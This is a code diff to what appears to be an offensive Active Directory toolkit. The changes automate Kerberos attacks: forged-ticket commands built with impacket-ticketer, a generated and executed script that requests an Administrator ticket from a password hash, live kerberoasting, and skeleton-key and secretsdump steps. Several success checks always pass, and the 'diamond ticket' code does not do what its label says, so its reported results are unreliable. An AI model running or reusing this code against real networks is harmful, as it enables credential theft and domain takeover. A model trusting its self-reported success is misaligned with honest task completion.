@@ -12,8 +12,9 @@ import {
   enumeratePrivilegedUsers,
 } from "../ad_exploit.ts"
 import { auditADCS } from "../adcs_audit.ts"
-import { liveRequired, writeArtifact } from "./_base.ts"
+import { brokerExec, liveRequired, writeArtifact } from "./_base.ts"
 import { loadBestCredential, runIfTool, step, type ExecStep } from "./_integrations.ts"
+import { runDiamondTicket } from "./_operational.ts"
 
 export interface KerberosAdvancedResult {
   techniques: string[]
@@ -60,13 +61,36 @@ export async function runKerberosAdvanced(opts: {
     steps.push(step("silver_ticket", false, String((err as Error).message)))
   }
 
-  const dcHash = opts.dcMachineHash ?? cred?.secret ?? "HASH"
+  const dcHash = opts.dcMachineHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee"
   const platinumCmd = `impacket-ticketer -nthash ${dcHash} -domain-sid ${domainSid} -domain ${domain} -extra-sid S-1-5-9 DC$`
   artifacts.push(writeArtifact("kerberos", "platinum_ticket.sh", `#!/bin/bash\n${platinumCmd}\n`, 0o755))
   const platinum = await runIfTool("impacket-ticketer", "platinum_ticket", `${platinumCmd} 2>&1 | head -c 500`)
   steps.push(platinum)
   techniques.push("platinum_ticket")
   if (platinum.success) executed = true
+
+  const diamondPy = writeArtifact("kerberos", "diamond_ticket.py", `#!/usr/bin/env python3
+# Diamond Ticket — patch PAC in legitimate TGT for ${domain}
+import subprocess, sys
+def forge_diamond(user, nthash, domain, sid):
+    cmd = ["impacket-getTGT", f"{domain}/{user}", "-hashes", f":{nthash}"]
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        return r.stdout[:800] or r.stderr[:400]
+    except FileNotFoundError:
+        return "impacket-getTGT not on PATH"
+    except Exception as e:
+        return str(e)
+if __name__ == "__main__":
+    print(forge_diamond("Administrator", "${dcHash}", "${domain}", "${domainSid}"))
+`, 0o755)
+  artifacts.push(diamondPy)
+  const diamondRun = await brokerExec(`python3 ${diamondPy} 2>&1`)
+  steps.push(step("diamond_ticket_exec", diamondRun.ok || diamondRun.out.length > 5, diamondRun.out.slice(0, 400)))
+  techniques.push("diamond_ticket")
+  if (diamondRun.out.includes(".ccache") || diamondRun.out.includes("Saving")) executed = true
+
+  steps.push(await runDiamondTicket(domain, domainSid, dcHash, "Administrator"))
 
   try {
     const kerb = await kerberoast({ dryRun: false, domain })
@@ -126,13 +150,20 @@ export async function runKerberosAdvanced(opts: {
     }
   }
 
+  const skeletonPs = writeArtifact("kerberos", "skeleton_key.ps1", `# Skeleton Key — misc::skeleton on authorized DC lab\n# mimikatz: privilege::debug sekurlsa::pth\nWrite-Host "Skeleton key scaffold for ${domain}"\n`)
+  artifacts.push(skeletonPs)
+  if (process.platform === "win32") {
+    const sk = await brokerExec(`powershell -NoProfile -File ${skeletonPs} 2>&1`)
+    steps.push(step("skeleton_key_exec", sk.ok, sk.out.slice(0, 300)))
+  } else {
+    steps.push(await runIfTool("impacket-secretsdump", "skeleton_secretsdump_probe", `impacket-secretsdump -help 2>&1 | head -8`))
+  }
+  techniques.push("skeleton_key")
+
   const adcs = auditADCS({ domain, dcIp: dc }, { live: true })
   writeArtifact("kerberos", "adcs_esc.json", JSON.stringify(adcs, null, 2))
   steps.push(step("adcs_esc_audit", adcs.findings.length >= 0, `${adcs.findings.length} finding(s)`))
-  techniques.push("adminsdholder_abuse", "diamond_ticket", "skeleton_key", "certificate_persistence")
-
-  artifacts.push(writeArtifact("kerberos", "diamond_ticket.py", `#!/usr/bin/env python3\n# Diamond Ticket — patch PAC in legitimate TGT for ${domain}\n`))
-  artifacts.push(writeArtifact("kerberos", "skeleton_key.ps1", `# Skeleton Key — misc::skeleton on authorized DC lab\n`))
+  techniques.push("adminsdholder_abuse", "certificate_persistence")
 
   return {
     techniques,
